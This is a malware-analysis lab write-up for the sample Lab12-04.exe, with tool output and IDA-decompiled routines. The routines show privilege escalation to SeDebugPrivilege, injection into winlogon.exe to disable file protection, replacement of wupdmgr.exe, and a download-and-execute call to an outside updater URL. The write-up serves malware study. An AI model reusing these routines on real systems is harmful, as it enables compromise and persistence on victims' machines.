Lab12-04.exe
    PE Analysis
        # Virustotal
            61/72
            SHA-256: e2aed4398e0178670d9678961ca89a0f15a3eac20f396bdf29de8ac66cb853fa

            PEiD packer
                Microsoft Visual C++

            TimeStamp: 2011-02-27 01:02:43

            Subsystem: Windows GUI
            
            Sections
                Name	Virtual Address	Virtual Size	Raw Size	Entropy	MD5
                .text	4096	1824	4096	3.12	77df9f7ebc4a2bc4bdf2b454d7635aee
                .rdata	8192	978	4096	1.59	d630e1eb49ed821e38202aefef911a39
                .data	12288	332	4096	0.51	d9a3822a7733a76776d8b6e64e364b9d
                .rsrc	16384	16480	20480	0.71	398569177d4d82090d3e1747be560f9a

            IMPORT
                ADVAPI32.dll
                    AdjustTokenPrivileges
                    LookupPrivilegeValueA
                    OpenProcessToken
                KERNEL32.dll
                    CreateRemoteThread
                    MoveFileA
                    GetTempPathA
                    SizeofResource
                    LoadResource
                    GetModuleHandleA
                    OpenProcess
                    GetWindowsDirectoryA
                    WriteFile
                    GetCurrentProcess
                    CloseHandle
                    CreateFileA
                    GetProcAddress
                    FindResourceA
                    LoadLibraryA
                    WinExec
                MSVCRT.dll

        # strings.exe (Only part of the results)
            \winup.exe
            %s%s
            \system32\wupdmgrd.exe
            %s%s
            http://www.practicalmalwareanalysis.com/updater.exe

        # Resource Hacker
            BIN101.bin

    Dynamic Analysis
        # RegShot (Part of results)
            ----------------------------------
            Keys deleted:1
            ----------------------------------
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020042320200424

            ----------------------------------
            Keys added:2
            ----------------------------------
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020042020200427
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020050220200503

            ----------------------------------
            Values deleted:7
            ----------------------------------
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\LinksBar\ItemCache\0\Expiration: 0x00000000
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\LinksBar\ItemCache\1\Expiration: 0x00000000
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020042320200424\CachePath: "%USERPROFILE%\Local Settings\History\History.IE5\MSHist012020042320200424"
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020042320200424\CachePrefix: ":2020042320200424: "
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020042320200424\CacheLimit: 0x00002000
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020042320200424\CacheOptions: 0x0000000B
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020042320200424\CacheRepair: 0x00000000

            ----------------------------------
            Values added:12
            ----------------------------------
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\Recovery\Active\{C176C6C3-8CB4-11EA-BFD0-08002784568B}: 0x00000000
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\SearchScopes\{0633EE93-D776-472f-A0FF-E1416B8B2E3A}\FaviconPath: "C:\Documents and Settings\practice\Local Settings\Application Data\Microsoft\Internet Explorer\Services\search_{0633EE93-D776-472f-A0FF-E1416B8B2E3A}.ico"
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020042020200427\CachePath: "%USERPROFILE%\Local Settings\History\History.IE5\MSHist012020042020200427"
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020042020200427\CachePrefix: ":2020042020200427: "
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020042020200427\CacheLimit: 0x00002000
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020042020200427\CacheOptions: 0x0000000B
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020042020200427\CacheRepair: 0x00000000
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020050220200503\CachePath: "%USERPROFILE%\Local Settings\History\History.IE5\MSHist012020050220200503"
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020050220200503\CachePrefix: ":2020050220200503: "
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020050220200503\CacheLimit: 0x00002000
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020050220200503\CacheOptions: 0x0000000B
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache\Extensible Cache\MSHist012020050220200503\CacheRepair: 0x00000000

            ----------------------------------
            Values modified:13
            ----------------------------------
            HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed: 96 EC 96 27 07 D6 9A 6F 15 3A FB 05 31 19 87 A7 9D 10 A2 37 38 B4 7E 8A BA 93 71 FB 2F D4 89 47 8E 37 FC 28 78 DD 54 7A 43 C5 14 03 47 7B F7 B5 12 F0 68 E4 96 63 7F 0D DE B2 2B 30 EF 8C 36 37 2D EB DF EF FC C0 58 BA 5B 2D 57 58 04 5A 25 ED
            HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed: 47 43 42 77 25 13 24 7A 8E B0 23 07 AB 5B A0 E1 48 BF C3 D0 DA 6C 37 84 66 B6 BA 5E 69 0E F3 8B C5 43 7F F0 67 29 63 85 99 DF CF 7F C7 DF F5 35 EE 6A DA 15 09 4D 04 BD 36 D3 9D C2 F4 76 13 35 77 E8 95 74 2D EF 10 C5 9E B4 CB ED EB 8B 34 C9
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\LinksBar\ItemCache\0\DisplayName: "Suggested Sites"
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\LinksBar\ItemCache\0\DisplayName: ""
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\LinksBar\ItemCache\0\DisplayMask: 0x00000004
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\LinksBar\ItemCache\0\DisplayMask: 0x00000000
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\LinksBar\ItemCache\0\ErrorState: 0x00000040
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\LinksBar\ItemCache\0\ErrorState: 0x00000000
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\LinksBar\ItemCache\1\DisplayName: "Web Slice Gallery"
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\LinksBar\ItemCache\1\DisplayName: ""
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\LinksBar\ItemCache\1\DisplayMask: 0x00000004
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\LinksBar\ItemCache\1\DisplayMask: 0x00000000
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\LinksBar\ItemCache\1\ErrorState: 0x00000040
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\LinksBar\ItemCache\1\ErrorState: 0x00000000
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\Main\IE8RunOnceLastShown_TIMESTAMP: A0 22 38 57 9C 19 D6 01
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Internet Explorer\Main\IE8RunOnceLastShown_TIMESTAMP: A0 5D 62 84 C1 20 D6 01
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\MenuOrder\Favorites\Links\Order: 08 00 00 00 02 00 00 00 E0 00 00 00 01 00 00 00 02 00 00 00 68 00 00 00 00 00 00 00 5A 00 32 00 EC 00 00 00 97 50 01 93 20 00 53 55 47 47 45 53 7E 31 2E 55 52 4C 00 00 3E 00 03 00 04 00 EF BE 97 50 01 93 97 50 01 93 14 00 00 00 53 00 75 00 67 00 67 00 65 00 73 00 74 00 65 00 64 00 20 00 53 00 69 00 74 00 65 00 73 00 2E 00 75 00 72 00 6C 00 00 00 1C 00 00 00 00 00 00 00 6C 00 00 00 01 00 00 00 5E 00 32 00 E2 00 00 00 97 50 A1 0A 20 00 57 45 42 53 4C 49 7E 31 2E 55 52 4C 00 00 42 00 03 00 04 00 EF BE 97 50 A1 0A 97 50 F1 92 14 00 00 00 57 00 65 00 62 00 20 00 53 00 6C 00 69 00 63 00 65 00 20 00 47 00 61 00 6C 00 6C 00 65 00 72 00 79 00 2E 00 75 00 72 00 6C 00 00 00 1C 00 00 00 00 00 00 00
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\MenuOrder\Favorites\Links\Order: 08 00 00 00 02 00 00 00 E0 00 00 00 01 00 00 00 02 00 00 00 68 00 00 00 00 00 00 00 5A 00 32 00 EC 00 00 00 97 50 01 93 20 00 53 55 47 47 45 53 7E 31 2E 55 52 4C 00 00 3E 00 03 00 04 00 EF BE 97 50 01 93 97 50 8E A9 14 00 00 00 53 00 75 00 67 00 67 00 65 00 73 00 74 00 65 00 64 00 20 00 53 00 69 00 74 00 65 00 73 00 2E 00 75 00 72 00 6C 00 00 00 1C 00 00 00 00 00 00 00 6C 00 00 00 01 00 00 00 5E 00 32 00 E2 00 00 00 97 50 A1 0A 20 00 57 45 42 53 4C 49 7E 31 2E 55 52 4C 00 00 42 00 03 00 04 00 EF BE 97 50 A1 0A 97 50 8E A9 14 00 00 00 57 00 65 00 62 00 20 00 53 00 6C 00 69 00 63 00 65 00 20 00 47 00 61 00 6C 00 6C 00 65 00 72 00 79 00 2E 00 75 00 72 00 6C 00 00 00 1C 00 00 00 00 00 00 00
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Ext\Stats\{E2E2DD38-D088-4134-82B7-F2BA38496583}\iexplore\Count: 0x00000003
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Ext\Stats\{E2E2DD38-D088-4134-82B7-F2BA38496583}\iexplore\Count: 0x00000004
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Ext\Stats\{E2E2DD38-D088-4134-82B7-F2BA38496583}\iexplore\Time: E4 07 04 00 04 00 17 00 15 00 0C 00 12 00 06 00
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Ext\Stats\{E2E2DD38-D088-4134-82B7-F2BA38496583}\iexplore\Time: E4 07 05 00 06 00 02 00 14 00 25 00 24 00 E5 02
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\SavedLegacySettings: 46 00 00 00 10 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 C0 54 DE 4C 9C 19 D6 01 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 02 00 00 00 0A 00 00 02 00 00 00 00 00 00 00 00 01 00 00 00 05 00 00 00 08 B8 16 00 60 35 18 00 00 00 00 00 10 01 00 00 FF FF FF FF 00 00 00 00 0C 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 03 A8 02 00 00 00 00 00 C0 00 00 00 00 00 00 46 40 9D 05 22 9E 7E CF 11 AE 5A 00 AA 00 A7 11 2B 6D 00 61 00 6C 00 77 00 61 00 72 00 65 00 00 00 00 00 00 00
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\SavedLegacySettings: 46 00 00 00 15 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 C0 54 DE 4C 9C 19 D6 01 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 02 00 00 00 0A 00 00 02 00 00 00 00 00 00 00 00 01 00 00 00 05 00 00 00 08 B8 16 00 60 35 18 00 00 00 00 00 10 01 00 00 FF FF FF FF 00 00 00 00 0C 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 03 A8 02 00 00 00 00 00 C0 00 00 00 00 00 00 46 40 9D 05 22 9E 7E CF 11 AE 5A 00 AA 00 A7 11 2B 6D 00 61 00 6C 00 77 00 61 00 72 00 65 00 00 00 00 00 00 00
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\SessionInformation\ProgramCount: 0x00000004
            HKU\S-1-5-21-1078081533-842925246-1708537768-1003\SessionInformation\ProgramCount: 0x00000005

        # procexp (View > Lower Pane View > DLLS / Handles)
            wupdmgr.exe	wupdmgr.exe		1,512 K	5,624 K	2964

        # procmon
            Filter
                Process name is Lab12-04.exe Include
                Operation is WriteFile Include

            Result
                2:03:01.7221668 PM	Lab12-04.exe	292	WriteFile	C:\WINDOWS\system32\wupdmgr.exe	SUCCESS	Offset: 0, Length: 16,384               // As same as BIN101.bin

        # autoruns
            NULL

        # ApateDNS
            www.practicalmalwareanalysis.com
            windowsupdate.microsoft.com
        
        # INetSim
            2020-05-02 16:37:36  HTTP connection, method: GET, URL: http://www.practicalmalwareanalysis.com/updater.exe, file name: /var/lib/inetsim/http/fakefiles/sample_gui.exe
            2020-05-02 16:37:37  HTTP connection, method: GET, URL: http://windowsupdate.microsoft.com/, file name: /var/lib/inetsim/http/fakefiles/sample.html
            2020-05-02 16:37:37  HTTP connection, method: GET, URL: http://www.live.com/favicon.ico, file name: /var/lib/inetsim/http/fakefiles/favicon.ico
            2020-05-02 16:37:37  HTTP connection, method: GET, URL: http://windowsupdate.microsoft.com/favicon.ico, file name: /var/lib/inetsim/http/fakefiles/favicon.ico
        
        # sc
            NULL

        # IDA Pro
            int __cdecl main(int argc, const char **argv, const char **envp)
            {
            proc_id_of_winlogon = 0;
            tmp_path = 0;
            memset(&v21, 0, 0x10Cu);
            v22 = 0;
            Buffer = 0;
            memset(&v17, 0, 0x10Cu);
            v18 = 0;
            proc_id_of_winlogon_0 = 0;
            v13 = 0;
            v3 = LoadLibraryA(psapi_dll);
            EnumProcessModules_addr = GetProcAddress(v3, EnumProcessModules);
            v4 = LoadLibraryA(psapi_dll_0);
            GetModuleBaseNameA_addr = GetProcAddress(v4, GetModuleBaseNameA);
            v5 = LoadLibraryA(psapi_dll_1);
            EnumProcesses_addr = GetProcAddress(v5, EnumProcesses);
            if ( !EnumProcesses_addr || !GetModuleBaseNameA_addr || !EnumProcessModules_addr )
                return 1;
            if ( !EnumProcesses_addr(dwProcessId, 4096, &v14) )
                return 1;
            v7 = v14 >> 2;
            for ( i = 0; i < v7 + 1; ++i )
            {
                if ( dwProcessId[i] )
                {
                proc_id_of_winlogon = get_winlogon_exe_proc_id(dwProcessId[i]);
                if ( proc_id_of_winlogon )
                {
                    proc_id_of_winlogon_0 = dwProcessId[i];
                    break;
                }
                }
            }
            if ( !proc_id_of_winlogon_0 )
                return 1;
            v12 = inject_to_winlogon_exe(proc_id_of_winlogon_0);// inject SfcTerminateWatcherThread into winlogon.exe to let it active next restart
            if ( !v12 )
                return 1;
            GetWindowsDirectoryA(&Buffer, 0x10Eu);
            snprintf(&system32_wupdmgr_exe, 0x10Eu, aSS_0, &Buffer, aSystem32Wupdmg_0);// \system32\wupdmgr.exe
            GetTempPathA(0x10Eu, &tmp_path);
            snprintf(&tmp_winup_exe, 0x10Eu, aSS_1, &tmp_path, aWinupExe);// \user\Temp\winup.exe
            MoveFileA(&system32_wupdmgr_exe, &tmp_winup_exe);// Backup original wupdmgr.exe
            Get_file_from_rsrc_and_start();
            return 0;
            }

            int __cdecl get_winlogon_exe_proc_id(DWORD dwProcessId)
            {
            strcpy(winlogon_exe, "winlogon.exe");
            strcpy(not_real, "<not real>");
            memset(&v5, 0, 0xF8u);
            v6 = 0;
            hObject = OpenProcess(0x410u, 0, dwProcessId);
            if ( hObject && EnumProcessModules_addr(hObject, &v3, 4, &v2) )
                GetModuleBaseNameA_addr(hObject, v3, not_real, 260);
            if ( !stricmp(not_real, winlogon_exe) )
            {
                CloseHandle(hObject);
                result = 1;
            }
            else
            {
                CloseHandle(hObject);
                result = 0;
            }
            return result;
            }

            int __cdecl inject_to_winlogon_exe(DWORD winlogon_exe_proc_id)
            {
            if ( Privilege_escalation(SeDebugPrivilege) )
                return 0;
            sfc_os_dll_handler = LoadLibraryA(sfc_os_dll);
            SfcTerminateWatcherThread = GetProcAddress(sfc_os_dll_handler, 2);// #2 function (SfcTerminateWatcherThread) in sfc_os.dll, check in dependcy.exe
            hProcess = OpenProcess(0x1F0FFFu, 0, winlogon_exe_proc_id);
            if ( !hProcess )
                return 0;
            CreateRemoteThread(hProcess, 0, 0, SfcTerminateWatcherThread, 0, 0, 0);// inject sfc_os.dll #2 into winlogon.exe
            return 1;
            }

            int __stdcall Privilege_escalation(LPCSTR SeDebugPrivilege)
            {
            v1 = GetCurrentProcess();
            if ( !OpenProcessToken(v1, 0x28u, &TokenHandle) )
                return 1;
            NewState.PrivilegeCount = 1;
            NewState.Privileges[0].Attributes = 2;
            if ( LookupPrivilegeValueA(0, SeDebugPrivilege, NewState.Privileges) )
            {
                AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);
                result = 0;
            }
            else
            {
                CloseHandle(TokenHandle);
                result = 1;
            }
            return result;
            }

            UINT Get_file_from_rsrc_and_start()
            {
            hModule = 0;
            hResInfo = 0;
            lpBuffer = 0;
            NumberOfBytesWritten = 0;
            nNumberOfBytesToWrite = 0;
            Buffer = 0;
            memset(&v8, 0, 0x10Cu);
            v9 = 0;
            wupdmgr = 0;
            memset(&v3, 0, 0x10Cu);
            v4 = 0;
            GetWindowsDirectoryA(&Buffer, 0x10Eu);
            snprintf(&wupdmgr, 0x10Eu, Format, &Buffer, aSystem32Wupdmg);// \system32\wupdmgr.exe
            hModule = GetModuleHandleA(0);
            hResInfo = FindResourceA(hModule, Name, Type);// BIN101
            lpBuffer = LoadResource(hModule, hResInfo);
            nNumberOfBytesToWrite = SizeofResource(hModule, hResInfo);
            wupdmgr_hFile = CreateFileA(&wupdmgr, 0x40000000u, 1u, 0, 2u, 0, 0);
            WriteFile(wupdmgr_hFile, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
            CloseHandle(wupdmgr_hFile);
            return WinExec(&wupdmgr, 0);
            }

BIN101.bin
        # IDA Pro
            int __cdecl main(int argc, const char **argv, const char **envp)
            {
            Buffer = 0;
            memset(&v11, 0, 0x10Cu);
            v12 = 0;
            Dest = 0;
            memset(&v14, 0, 0x10Cu);
            v15 = 0;
            v7 = 0;
            memset(&v8, 0, 0x10Cu);
            v9 = 0;
            CmdLine = 0;
            memset(&v5, 0, 0x10Cu);
            v6 = 0;
            GetTempPathA(0x10Eu, &Buffer);
            snprintf(&Dest, 0x10Eu, Format, &Buffer, aWinupExe);// \user\tmp\winup.exe
            WinExec(&Dest, 5u);                           // avoid update problem
            GetWindowsDirectoryA(&v7, 0x10Eu);
            snprintf(&CmdLine, 0x10Eu, aSS_0, &v7, aSystem32Wupdmg);// \system32\wupdmgrd.exe
            if ( !URLDownloadToFileA(0, aHttpWwwPractic, &CmdLine, 0, 0) )// http://www.practicalmalwareanalysis.com/updater.exe recover wupdmgrd.exe
                WinExec(&CmdLine, 0);
            return 0;
            }

Analysis
    The malware find the process id of winlogon.exe and inject SfcTerminateWatcherThread into it to disable file protection in next restart. Then it restored original wupdmgr.exe in the user tmp directory and release its rsrc section as a new wupdmgr.exe in system32 directory.
    Also it update malware from www.practicalmalwareanalysis.com/updater.exe to wupdmgrd.exe.